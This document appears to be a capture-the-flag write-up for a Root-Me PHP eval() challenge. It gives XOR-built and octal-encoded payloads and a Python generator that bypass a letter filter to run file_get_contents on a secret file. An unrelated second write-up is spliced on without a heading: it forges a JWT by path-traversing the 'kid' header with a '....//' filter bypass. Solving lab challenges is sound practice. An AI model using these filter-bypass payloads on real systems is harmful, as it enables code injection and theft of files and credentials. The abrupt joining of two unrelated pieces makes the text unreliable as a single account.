
# PHP - Eval  ( Non-alphanumeric PHP code )

Challenge category : WEB-SERVER \
Difficulty : MEDIUM \
Links :  https://www.root-me.org/en/Challenges/Web-Server/PHP-Eval / https://www.root-me.org/en/Challenges/Web-Server/PHP-Eval

For this challenge there are 2 solutions , but in this writeup I will show only the first one 

Let's analyze the challenge  : 
```
Statement
Find a vulnerability in this service and exploit it.

Note : the flag is in .passwd file.
```
Source code : 
```php
<html>
<head>
</head>
<body>
 
<h4> PHP Calc </h4>
 
<form action='index.php' method='post'>
    <input type='text' id='input' name='input' />
    <input type='submit' />
<?php
 
if (isset($_POST['input'])) {
    if(!preg_match('/[a-zA-Z`]/', $_POST['input'])){
        print '<fieldset><legend>Result</legend>';
        eval('print '.$_POST['input'].";");
        print '</fieldset>';
    }
    else
        echo "<p>Dangerous code detected</p>";
}
?>
</form>
</body>
</html>

```
As the index says it should be a PHP calculator , but it uses the eval() function to do "calculations" and this makes it vulnerable to code injection 
![](./images/1.png)
![](./images/2.png)

We can enter numbers or special characters but not letters because the input is filtered by the preg_match() function : 
```php
 if(!preg_match('/[a-zA-Z`]/', $_POST['input']))
```

There are 2 ways to bypass this filter ( as mentioned above) , in this case we will have the eval() function perform XOR operations on special characters 
```
RAW   |  BINARY
/     =  00101111
            ⊕
_     =  01011111  

p     =  01110000

In PHP  XOR=^ so ('/' ^ '_')= 'p'

Example: 
p = ('/'^'_')
a = ('!'^'@')
s = ('('^'[')
s = ('('^'[')
w = ('('^'_')
d = ('$'^'@')

passwd   =  ('/'^'_').('!'^'@').('('^'[').('('^'[').('('^'_').('$'^'@')
```
Let's try entering the string above into the input field
![](./images/3.png)

It returned `passwd` 

Now let's try reading the contents of the `.passwd` file (which contains the flag as mentioned in the challege description) \
To do this we need to convert the `file_get_contents('.passwd')` function to XOR operations , I wrote a python script (don't mind the not-so-clean code ) : 

```python
import re
charset = ['!','$','%','&','/','(',')','=','{','[',']','}',',',';','.',':','-','_','+','*','~','#','\'','@','<','>','|','?','^',' ']

plain_text="file_get_contents('.passwd')"
pt_dict=[*plain_text]
payload=f""
fnd=0
for letter in pt_dict:
    fnd=0
    if not re.match('[a-zA-Z]',letter):
        if letter == '\'' : 
            letter='\\\''
        if letter == '"' : 
            letter = '\\"'
        payload+=f"'{letter}'."
        continue
    for char1 in charset :
        if fnd:
            fnd=1
            break
        for char2 in charset:
            if ord(char1)^ord(char2)==ord(letter):
                #print (f"{letter} : ('{char1}'^'{char2}'). \n ")
                payload+=f"('{char1}'^'{char2}')."
                fnd=1
                break
        
print (payload)
```
The script output will be : `('&'^'@').(')'^'@').(','^'@').('%'^'@').'_'.('['^'<').('%'^'@').('/'^'[').'_'.('='^'^').('/'^'@').('.'^'@').('/'^'[').('%'^'@').('.'^'@').('/'^'[').('('^'[').'('.'\''.'.'.('/'^'_').('!'^'@').('('^'[').('('^'[').('('^'_').('$'^'@').'\''.')'` \
Let's try entering the string above into the input field
![](./images/4.png)

As we can see the function is not executed but is printed , so let's try another way of executing a function : `(function)(arg)` so `(file_get_contents)(.passwd)`
```
(('&'^'@').(')'^'@').(','^'@').('%'^'@').'_'.('['^'<').('%'^'@').('/'^'[').'_'.('='^'^').('/'^'@').('.'^'@').('/'^'[').('%'^'@').('.'^'@').('/'^'[').('('^'['))('.'.('/'^'_').('!'^'@').('('^'[').('('^'[').('('^'_').('$'^'@'))
```

![](./images/5.png)
Great ! it works. ✅


\ 
\
\
The other method is similar but uses octal encoding of characters, it is easier but I like more difficult methods 😜


```
 "\146\151\154\145\137\147\145\164\137\143\157\156\164\145\156\164\163"("\56\160\141\163\163\167\144")
 ```






\
\
\
\
\
\
\

```
Cookie: session=eyJhbGciOiJIUzI1NiIsImtpZCI6ImI5MDFiYjI0LTcwMGItNGNjNi1hNzFhLWNiMjA3YWI2MTMxMyIsInR5cCI6IkpXVCJ9.eyJ1c2VyIjoiZ3Vlc3QiLCJpYXQiOjE2OTM3MjY5MTV9.GMHoWnEW4uwXc7bF7LwjsULTvbPG16CTm_KyjCp-Jfw
```
The server responds with a json 
```
{"Unauthorized":"You are not admin !"}
```
We try to decode the token from base64 (using https://jwt.io/#debugger-io):
![](/images/4.png)

The first attempt made was to try to crack the token signing key with HashCat or John , but unfortunately I did not get any results, so let's take a closer look at the decoded token and notice a parameter in the header : 
```
"kid": "b901bb24-700b-4cc6-a71a-cb207ab61313"
```

Kid stands for Key ID ( https://www.rfc-editor.org/rfc/rfc7515#section-4.1.4 ) \
```
4.1.4.  "kid" (Key ID) Header Parameter

   The "kid" (key ID) Header Parameter is a hint indicating which key
   was used to secure the JWS.  This parameter allows originators to
   explicitly signal a change of key to recipients.  The structure of
   the "kid" value is unspecified.  Its value MUST be a case-sensitive
   string.  Use of this Header Parameter is OPTIONAL.

   When used with a JWK, the "kid" value is used to match a JWK "kid"
   parameter value.
```
Let us try playing with the KID parameter and create a token by entering `test` in the KID parameter and `secret` for the token signature key
![](/images/5.png)

We send the request with the token modified with Burp's Repeater
![](/images/6.png)

and we notice that the KID is not stored in a database but retrieves a file in the path `keys/[KID_FILENAME]`,so test if the file containing the signature key is readable by going to  http://challenge01.root-me.org:59081/keys/b901bb24-700b-4cc6-a71a-cb207ab61313 but we get 404 response 

At this point we know that the signature key is read from a file so let's try entering the path to a file we know : 
![](/images/2.png)

for example `static/challs/htmllecture.html`
![](/images/7.png)

let's try entering the file path with a Path Traversal `../static/challs/htmllecture.html` and as the signature key the contents of `htmllecture.html` so : `FLAG: ROUTEMI{c_le_premier_chall}`
![](/images/8.png)
![](/images/9.png)

There is a filter that removes `../` so we try to bypass it using `....//`
![](/images/10.png)
![](/images/11.png)

Great the game is done !!!








